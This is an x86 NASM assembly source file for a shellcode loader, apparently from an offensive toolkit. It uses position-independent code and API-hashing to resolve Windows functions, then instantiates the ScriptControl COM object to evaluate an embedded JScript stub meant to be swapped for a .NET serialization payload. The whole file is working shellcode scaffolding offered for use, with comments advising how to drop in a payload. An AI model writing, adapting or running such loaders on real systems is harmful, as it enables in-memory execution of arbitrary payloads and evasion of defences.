; .NET serialization loader
; function loader and stub borrowed from Didier Steven
; You should probably use the CLR shellcode unless you specifically need
; serialization. In which case, just pop your string into the SO variable and 
; compile via nasm.

BITS 32

%define LANGUAGE_VALUE "JScript"
%define STUB_VALUE "var x=123;"

OLE32_HASH 					equ 0x0001b408
OLE32_NUMBER_OF_FUNCTIONS 	equ 2
OLE32_COINITIALIZE_HASH 	equ	0x000cfe1a
OLE32_COCREATEINSTANCE_HASH equ 0x00ce4916

KERNEL32_HASH 					equ 0x000d4e88
KERNEL32_NUMBER_OF_FUNCTIONS	equ 2
KERNEL32_LOADLIBRARYA_HASH		equ 0x000d5786
KERNEL32_GETPROCADDRESS_HASH	equ 0x00348bfa

OLEAUT32_HASH					equ 0x000d8c88
OLEAUT32_NUMBER_OF_FUNCTIONS    equ 2
OLEAUT32_SYSALLOCSTRING_HASH    equ 0x003978ae
OLEAUT32_VARIANTINIT_HASH 		equ 0x0006e80c

segment .text
	call geteip
geteip:
	pop ebx

	; setup kernel32
	lea esi, [KERNEL32_FUNCTIONS_TABLE-geteip+ebx]
	push esi
	lea esi, [KERNEL32_HASHES_TABLE-geteip+ebx]
	push esi
	push byte KERNEL32_NUMBER_OF_FUNCTIONS
	push KERNEL32_HASH
	call LookupFunctions

	; LoadLibraryA(ole32.dll)
	lea esi, [OLE32DLL-geteip+ebx]
	push esi
	call [KERNEL32_LOADLIBRARY-geteip+ebx]

	; setup ole32
	lea esi, [OLE32_FUNCTIONS_TABLE-geteip+ebx]
	push esi
	lea esi, [OLE32_HASHES_TABLE-geteip+ebx]
	push esi
	push byte OLE32_NUMBER_OF_FUNCTIONS
	push OLE32_HASH
	call LookupFunctions

	; setup oleaut32
	lea esi, [OLEAUT32_FUNCTIONS_TABLE-geteip+ebx]
	push esi
	lea esi, [OLEAUT32_HASHES_TABLE-geteip+ebx]
	push esi
	push byte OLEAUT32_NUMBER_OF_FUNCTIONS
	push OLEAUT32_HASH
	call LookupFunctions

	; CoInitialize(0)
	push byte 0
	call [OLE32_COINITIALIZE-geteip+ebx]

	; hr = CoCreateInstance(CLSID_IScriptControl, 0, CLSCTX_ALL, IID_IDispatch, (PVOID*)&pScriptControl)
	lea esi, [SCRIPTCONTROL-geteip+ebx]
	push esi
	lea esi, [IID_IDISPATCH-geteip+ebx]
	push esi
	push byte 0x17
	xor edi, edi
	push edi
	lea esi, [CLSID_ISCRIPTCONTROL-geteip+ebx]
	push esi
	call [OLE32_COCREATEINSTANCE-geteip+ebx]
	test eax, eax
	jnz done

	; bbstr = SysAllocString(LANGUAGE)
	lea esi, [LANGUAGE-geteip+ebx]
	push esi
	call [OLEAUT32_SYSALLOCSTRING-geteip+ebx]
	test eax,eax
	jz done
	mov [BBSTR-geteip+ebx], eax

	; pScriptControl->Language = "JScript"
	mov esi, [BBSTR-geteip+ebx]
	push esi
	mov edx, [SCRIPTCONTROL-geteip+ebx]
	push edx
	mov ecx, [edx]
	call [ecx+32]

	; bbstr = SysAllocString(STUB)
	lea esi, [STUB-geteip+ebx]
	push esi
	call [OLEAUT32_SYSALLOCSTRING-geteip+ebx]
	test eax,eax
	jz done
	mov [BBSTR-geteip+ebx], eax

	; VariantInit(&variant)
	lea esi, [VARIANT-geteip+ebx]
	push esi
	call [OLEAUT32_VARIANTINIT-geteip+ebx]

	; pScriptControl->Eval(STUB)
	lea esi, [VARIANT-geteip+ebx]
	push esi
	mov esi, [BBSTR-geteip+ebx]
	push esi
	mov edx, [SCRIPTCONTROL-geteip+ebx]
	push edx
	mov ecx, [edx]
	call [ecx+108]

done:
	ret

%include "sc-api-functions.asm"

OLE32_HASHES_TABLE:
	dd OLE32_COINITIALIZE_HASH
	dd OLE32_COCREATEINSTANCE_HASH

KERNEL32_HASHES_TABLE:
	dd KERNEL32_LOADLIBRARYA_HASH
	dd KERNEL32_GETPROCADDRESS_HASH

OLEAUT32_HASHES_TABLE:
	dd OLEAUT32_SYSALLOCSTRING_HASH
	dd OLEAUT32_VARIANTINIT_HASH

CLSID_ISCRIPTCONTROL:
db 0xd5,0xf1,0x59,0x0e,0xbe,0x1f,0xd0,0x11,0x8f,0xf2,0x00,0xa0,0xd1,0x00,0x38,0xbc
IID_IDISPATCH:
db 0x00,0x04,0x02,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46

OLE32_FUNCTIONS_TABLE:
OLE32_COINITIALIZE 		dd 0x00000000
OLE32_COCREATEINSTANCE  dd 0x00000000

KERNEL32_FUNCTIONS_TABLE:
KERNEL32_LOADLIBRARY 	dd 0x00000000
KERNEL32_GETPROCADDRESS dd 0x00000000

OLEAUT32_FUNCTIONS_TABLE:
OLEAUT32_SYSALLOCSTRING dd 0x00000000
OLEAUT32_VARIANTINIT    dd 0x00000000

SCRIPTCONTROL 			dd 0x00000000
BBSTR					dd 0x00000000
VARIANT					dd 0x00000000

OLE32DLL:
	db "ole32.dll", 0

LANGUAGE:
	db __utf16__(LANGUAGE_VALUE), 0, 0
STUB:
	db __utf16__(STUB_VALUE), 0, 0